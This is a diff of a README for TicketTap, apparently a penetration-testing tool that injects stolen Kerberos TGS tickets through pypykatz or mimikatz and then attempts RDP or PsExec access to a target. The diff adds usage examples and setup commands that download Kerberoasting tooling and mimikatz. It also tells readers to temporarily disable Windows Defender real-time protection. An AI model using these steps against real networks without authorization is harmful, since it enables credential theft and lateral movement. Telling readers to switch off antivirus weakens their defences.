@@ -98,10 +98,10 @@ To use the **Bash script** with **pypykatz** for macOS/Linux, follow the instruc
 
 #### Example Usage:
 ```bash
-./scriptname.sh -u TechMech -t /path/to/TechMech_tgs.kirbi -m /path/to/pypykatz -ip 192.168.1.10
+./tickettap.sh -u Username -t /path/to/TGS.kirbi -m /path/to/pypykatz -ip <ip addr>
 ```
 
-- This injects the **TGS** for user `TechMech` and attempts an RDP connection to the target IP.
+- This injects the **TGS** for user `Username` and attempts an RDP connection to the target IP.
 - If you want to use **PsExec**, provide the `-psexec`, `-d`, and `-pu` flags as well.
 
 #### Flags:
@@ -119,7 +119,7 @@ For **Windows**, use the PowerShell script to inject a **TGS** and attempt an RD
 
 #### Example Usage:
 ```bash
-.\scriptname.ps1 /u TechMech /tgsFile C:\path\to\TechMech_tgs.kirbi /mimikatz C:\path\to\mimikatz.exe /ip 192.168.1.10
+.\tickettap.ps1 /u Username /t C:\path\to\TGS.kirbi /mimikatz C:\path\to\mimikatz.exe /ip <ip addr>
 ```
 
 - Injects the **TGS** and attempts to establish an RDP connection.
@@ -136,39 +136,31 @@ Here are setup commands to create the necessary directories, download scripts, a
 1. **Create a directory** and **download scripts**:
     ```bash
     mkdir TicketTap && cd TicketTap
-    curl -O https://your-repository-url/scriptname.sh
+    curl -O https://raw.githubusercontent.com/jleuth/TicketTap/refs/heads/main/tickettap.sh > tickettap.sh
     ```
 
 2. **Clone dependencies**:
     ```bash
-    git clone https://github.com/SecureAuthCorp/impacket.git
-    git clone https://github.com/skelsec/pypykatz.git
-    ```
-
-3. **Install dependencies**:
-    ```bash
-    pip install -r impacket/requirements.txt
-    pip install -r pypykatz/requirements.txt
+    curl -O https://raw.githubusercontent.com/fortra/impacket/refs/heads/master/examples/GetUserSPNs.py > GetUserSPNs.py
+    pip3 install pypykatz
     ```
 
 ### Windows Setup
 
 1. **Create a directory** and **download scripts**:
-    ```bash
+    ```powershell
     mkdir TicketTap && cd TicketTap
-    curl.exe -O https://your-repository-url/scriptname.ps1
+    curl -O https://raw.githubusercontent.com/jleuth/TicketTap/refs/heads/main/tickettap.ps1 > tickettap.ps1
     ```
 
 2. **Clone dependencies**:
-    ```bash
-    git clone https://github.com/SecureAuthCorp/impacket.git
-    curl.exe -O https://download.mimikatz.com/latest
+    ```powershell
+    curl -O https://raw.githubusercontent.com/fortra/impacket/refs/heads/master/examples/GetUserSPNs.py > GetUserSPNs.py
+    git clone https://github.com/ParrotSec/mimikatz.git 
     ```
 
-3. **Install Python and dependencies**:
-    ```bash
-    python -m pip install -r impacket/requirements.txt
-    ```
+3. **Build Mimikatz**:
+  Annoyingly, Microsoft HATES Mimikatz, and Windows Defender goes fucking NUTS if you dare even download it. Mimikatz is safe, and [FOSS](https://github.com/ParrotSec/mimikatz) so there's nothing to fear. TEMPORARILY disable Real Time Protection in Defender settings, do what you need to do with Mimikatz, then TURN IT BACK ON! Windows Defender is ass, but it's better than nothing.
 
 ---
 
